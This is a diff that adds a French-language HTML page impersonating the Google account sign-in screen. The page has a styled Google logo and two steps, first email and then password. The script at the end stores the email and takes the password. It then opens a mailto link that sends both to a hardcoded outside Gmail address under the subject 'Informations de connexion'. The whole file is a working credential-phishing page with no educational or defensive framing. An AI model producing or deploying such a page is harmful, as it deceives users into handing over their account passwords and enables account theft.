@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion : comptes Google</title>
+    <style>
+
+        body {
+            background-color: #ffffff(247, 247, 252);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: auto;
+        }
+
+        .monFormulaire {
+            display: block; 
+        }
+
+        .nouveauFormulaire {
+            display: none; 
+        }
+
+        .container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 405px;
+            text-align: center;
+            height: 480px;
+        }
+
+        h1 {
+            font-size: 24px;
+            text-align: center;
+            margin-top: 2px;
+            color: #221e1e;
+            }
+
+        h2 {
+            font-size: 18px;
+            text-align: center;
+            margin-top: 10px;
+            color: #221e1e;
+        }
+
+        input[type="email"] {
+            width: 95%;
+            padding: 10px; 
+            margin: 10px 0; 
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            height: 40px;
+            margin-top: 1px;
+        }
+
+        input[type="password"] {
+            width: 95%;
+            padding: 10px; 
+            margin: 10px 0; 
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            height: 40px;
+            margin-top: 1px;
+        }
+
+        .input[type="checkbox"] {
+            text-align: left;
+            display: none;
+        }
+
+
+        button {
+            background-color: #4285f4;
+            color: #fff;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #357ae8;
+        }
+
+        .forgot-link {
+            text-align: left;
+            margin-top: 5px;
+        }
+
+        .create-account {
+            display: flex;
+            align-items: center;
+            justify-content: space-between; 
+            margin-top: 10px;
+        }
+
+        .create-account label {
+            margin-right: 10px;
+        }
+
+        
+
+        .next-button {
+            background-color: #4285f4;
+            color: #fff;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .next-button:hover {
+            background-color: #357ae8;
+        }
+   
+        .google-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+           .g {
+               color: #4285f4; 
+               font-size: 27px;
+           }
+   
+           .o1 {
+               color: #dd2620; 
+               font-size: 27px;
+           }
+   
+           .o2 {
+               color: #f4b400; 
+               font-size: 27px;
+           }
+   
+           .g2 {
+               color: #4285f4;
+               font-size: 27px;
+           }
+   
+           .l {
+               color: #19e719; 
+               font-size: 27px;
+           }
+
+           .e {
+               color: #f3680c;
+               font-size: 27px;
+           }
+           
+    </style>
+</head>
+<body>
+    <div class="container" id="monFormulaire">
+        <p></p>
+        <div class="google-logo">
+            <span class="g">G</span>
+            <span class="o1">o</span>
+            <span class="o2">o</span>
+            <span class="g2">g</span>
+            <span class="l">l</span>
+            <span class="e">e</span>
+        </div>
+        <p></p>
+        <h1>Connexion </h1>
+        <p></p>
+        <h2>Utiliser votre compte Google</h2>
+        <form action="#" method="post">
+            <input type="email" id="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
+            <p class="forgot-link">
+                <a href="#">Adresse email oubliées ?</a>
+            </p>
+            <p></p>
+            <div class="private-browsing">
+                <p>S'il ne s'agit pas de votre ordinateur, utilisez une fenêtre de navigation privée pour vous connecter. <a href="#">En savoir plus</a></p>
+            </div>
+            <br><br>
+            <div class="create-account">
+                <a href="#"><label for="create-account">Créer un compte</label></a>
+                <button class="next-button" type="button" onclick="handleFirstForm()">Suivant</button>
+            </div>
+        </form>
+    </div>
+    <script>
+        function handleFirstForm() {
+            const email = document.getElementById('email').value;
+            localStorage.setItem('email', email);
+            afficherNouveauFormulaire(email);
+        }
+
+        function afficherNouveauFormulaire(email) {
+            var form2 = `
+                <style>
+                    button {
+                        background-color: #4285f4;
+                        color: #fff;
+                        align-items: center; 
+                        padding: 12px 20px;
+                        border: none;
+                        border-radius: 5px;
+                        font-size: 16px;
+                        cursor: pointer;
+                        align-self: flex-start; 
+                    }
+                    button:hover {
+                        background-color: #357ae8;
+                        margin-left: 10px; 
+                    }  
+
+                    .forget_password {
+                        display: flex;
+                        align-items: center; 
+                        padding: 20px;
+                        border-radius: 10px;
+                    }
+                   .forget_password a label {
+                        color: blue;
+                        margin-right: 10px;
+                    }
+                    .next-button {
+                        background-color: #4285f4;
+                        color: #fff;
+                        padding: 12px 20px;
+                        border: none;
+                        border-radius: 5px;
+                        font-size: 16px;
+                        cursor: pointer;
+                    }
+                    .next-button:hover {
+                        background-color: #357ae8;
+                    }                          
+                </style>
+
+                <div class="container" id="nouveauFormulaire">
+                    <p></p>
+                    <div class="google-logo">
+                        <span class="g">G</span>
+                        <span class="o1">o</span>
+                        <span class="o2">o</span>
+                        <span class="g2">g</span>
+                        <span class="l">l</span>
+                        <span class="e">e</span>
+                    </div>
+                    <p></p>
+                    <h1>Bienvenue </h1>
+                    <p></p>
+                    <h2>${email}</h2>
+                    <form id="secondForm">
+                        <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+                        <label>
+                            <input type="checkbox" id="Case" name="maCase">
+                            Afficher le mot de passe
+                        </label>
+                        <br><br>
+                        <div class="forget_password">
+                            <a href="#"><label for="forget_password">Mot de passe oublié</label></a>
+                        </div>
+                        <div class="button">
+                            <button class="button" type="button" onclick="handleSecondForm()">Envoye</button>
+                        </div>
+                    </form>
+                </div>
+           `;
+            var form1 = document.getElementById('monFormulaire');
+            form1.innerHTML = form2;
+            document.getElementById('nouveauFormulaire').style.display = 'block';
+        }
+
+        function sendEmail() {
+            const email = localStorage.getItem('email');
+            const password = document.getElementById('password').value;
+            const body = `mail: ${email}Google\npasse: ${password}Connexion`;
+            const recipient = 'ledamel963@gmail.com';
+            const mailtoLink = `mailto:${recipient}?subject=Informations de connexion&body=${encodeURIComponent(body)}`;
+            window.location.href = mailtoLink;
+        }
+
+        function handleSecondForm() {
+            sendEmail()
+        }
+    </script>
+</body>
+</html>
